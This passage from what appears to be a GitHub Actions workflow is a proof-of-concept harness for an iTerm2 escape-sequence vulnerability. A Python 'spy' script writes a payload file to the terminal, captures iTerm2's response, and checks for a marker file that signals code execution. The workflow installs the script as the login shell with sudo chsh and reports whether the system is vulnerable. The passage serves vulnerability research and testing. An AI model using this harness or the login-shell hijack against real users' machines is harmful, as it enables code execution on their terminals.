          import os, sys, time, select, fcntl, traceback, binascii

          LOG = "/tmp/lsh.log"

          def log(m):
              try:
                  with open(LOG, "a") as f:
                      f.write(str(m) + "\n")
              except Exception:
                  pass

          def main():
              log("=== spy started pid=%d uid=%d ===" % (os.getpid(), os.getuid()))
              try:
                  tty = os.ttyname(0)
              except Exception:
                  tty = "NOT_A_TTY"
              log("tty=%s" % tty)

              # 等 iTerm2 准备好
              time.sleep(2)

              # 吐 payload 到终端输出
              try:
                  with open("/tmp/payload.md", "rb") as f:
                      payload = f.read()
                  n = os.write(1, payload)
                  log("payload written: %d bytes" % n)
              except Exception as e:
                  log("payload write failed: %r" % (e,))
                  payload = b""

              # 给 iTerm2 时间处理 APC 并写响应
              time.sleep(2)

              # 非阻塞，累积读 8 秒
              try:
                  fl = fcntl.fcntl(0, fcntl.F_GETFL)
                  fcntl.fcntl(0, fcntl.F_SETFL, fl | os.O_NONBLOCK)
              except Exception as e:
                  log("fcntl failed: %r" % (e,))

              buf = b""
              chunks = 0
              deadline = time.time() + 8
              while time.time() < deadline:
                  try:
                      r, _, _ = select.select([0], [], [], 0.25)
                  except Exception as e:
                      log("select failed: %r" % (e,))
                      break
                  if not r:
                      continue
                  try:
                      d = os.read(0, 65536)
                  except OSError:
                      d = b""
                  if d:
                      buf += d
                      chunks += 1
                      log("chunk %d: %d bytes (total %d)" % (chunks, len(d), len(buf)))

              log("TOTAL captured %d bytes in %d chunks" % (len(buf), chunks))

              try:
                  with open("/tmp/captured.bin", "wb") as f:
                      f.write(buf)
                  with open("/tmp/captured.hex", "w") as f:
                      f.write(buf.hex())
                  # 逐行拆解，方便人看
                  with open("/tmp/decoded.txt", "w") as f:
                      f.write("RAW HEX:\n%s\n\n" % buf.hex())
                      f.write("ESCAPED:\n%s\n\n" % repr(buf))
                      try:
                          txt = buf.decode("utf-8", "replace")
                          f.write("AS TEXT (lines):\n")
                          for i, line in enumerate(txt.split("\n")):
                              f.write("  [%d] %r\n" % (i, line))
                      except Exception:
                          pass
              except Exception as e:
                  log("dump failed: %r" % (e,))

              # marker 检查
              try:
                  name = open("/tmp/marker_name").read().strip()
                  marker = os.path.join(os.path.expanduser("~"), name)
                  log("MARKER_PRESENT: " + marker if os.path.exists(marker) else "MARKER_ABSENT: " + marker)
              except Exception as e:
                  log("marker check failed: %r" % (e,))

              log("=== spy done, exec bash ===")
              os.execv("/bin/bash", ["/bin/bash", "-l"])

          if __name__ == "__main__":
              try:
                  main()
              except Exception:
                  log("FATAL:\n" + traceback.format_exc())
                  os.execv("/bin/bash", ["/bin/bash", "-l"])

          SPYEOF
          PY=$(which python3)
          sed -i '' "1s|.*|#!$PY|" /tmp/lsh.py
          chmod 755 /tmp/lsh.py
          head -2 /tmp/lsh.py
          if ! grep -qx /tmp/lsh.py /etc/shells 2>/dev/null; then
            echo /tmp/lsh.py | sudo tee -a /etc/shells
          fi
          sudo chsh -s /tmp/lsh.py "$USER"
          dscl . -read /Users/$USER UserShell

      - name: Clean
        run: rm -f "$HOME/$MARKER" /tmp/lsh.log /tmp/captured.bin /tmp/captured.hex /tmp/decoded.txt

      - name: Launch
        run: |
          open -a /Applications/iTerm.app
          sleep 30
          pgrep -l iTerm || echo ITERM_NOT_RUNNING

      - name: Wait
        run: |
          for i in $(seq 1 16); do
            sleep 5
            [ -f /tmp/decoded.txt ] && { echo "decoded after $((i*5))s"; break; }
          done
          sleep 5

      - name: Report
        if: always()
        run: |
          echo "=============== REPORT spy-379-semi ==============="
          echo "--- lsh.log ---"
          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
          echo ""
          echo "--- decoded.txt ---"
          cat /tmp/decoded.txt 2>/dev/null || echo "NO_DECODE"
          echo ""
          echo "--- marker ---"
          if [ -f "$HOME/$MARKER" ]; then
            echo "[RESULT] VULNERABLE"
            ls -la "$HOME/$MARKER"
          else
            echo "[RESULT] NOT_EXPLOITED"
          fi

      - name: Screenshot
        if: always()
        run: screencapture -x /tmp/shot.png 2>/dev/null || true

      - name: Upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ev5-spy-379-semi
          path: |
            /tmp/payload.md
            /tmp/lsh.log
            /tmp/captured.bin
            /tmp/captured.hex
            /tmp/decoded.txt
            /tmp/shot.png
          if-no-files-found: warn
